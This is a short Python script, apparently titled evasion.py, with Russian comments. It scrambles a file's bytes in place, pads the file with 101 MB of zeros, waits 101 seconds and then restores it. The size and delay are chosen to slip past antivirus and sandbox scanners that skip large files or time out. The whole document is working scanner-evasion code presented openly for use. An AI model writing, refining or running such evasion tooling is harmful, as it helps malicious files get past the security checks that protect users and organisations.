import os
import time
import hashlib

# Constants
PADDING_SIZE = 101 * 1024 * 1024  # 101 МБ
EVADE_TIME = 101  # 101 секунда
KEY_INCREMENT = 5
INDEX_INCREMENT = 100001

def modify_byte(byte, index, encrypt=True):
    if encrypt:
        return (byte + KEY_INCREMENT + index * INDEX_INCREMENT) % 256
    else:
        return (byte - KEY_INCREMENT - index * INDEX_INCREMENT) % 256

def encrypt_file(file_path):
    print("Encryption started...")
    with open(file_path, 'rb') as original_file:
        original_data = original_file.read()
    
    modified_data = bytearray()
    for index, byte in enumerate(original_data):
        modified_data.append(modify_byte(byte, index))
    
    # Empty space adding
    modified_data += bytearray(PADDING_SIZE)
    
    with open(file_path, 'wb') as modified_file:
        modified_file.write(modified_data)
    
    print("File encrypted and size increased.")

def decrypt_file(file_path):
    print("Decryption started...")
    with open(file_path, 'rb') as modified_file:
        modified_data = modified_file.read()

    original_size = len(modified_data) - PADDING_SIZE
    original_data = bytearray()
    for index in range(original_size):
        original_data.append(modify_byte(modified_data[index], index, encrypt=False))
    
    with open(file_path, 'wb') as original_file:
        original_file.write(original_data)
    
    print("File decrypted and size restored.")


def calculate_hash(file_path):
    hash_sha256 = hashlib.sha256()
    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_sha256.update(chunk)
    return hash_sha256.hexdigest()

def main(file_path):
    original_hash = calculate_hash(file_path)
    print(f"Original file hash: {original_hash}")
    encrypt_file(file_path)
    print(f"Waiting for {EVADE_TIME} seconds...")
    changed_file_hash = calculate_hash(file_path)
    print(f"Increased file hash: {changed_file_hash}")
    time.sleep(EVADE_TIME)
    current_time = time.time()

    decrypt_file(file_path)
    print("Process completed.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python evasion.py <file_path>")
        sys.exit(1)
    
    file_path = sys.argv[1]
    main(file_path)
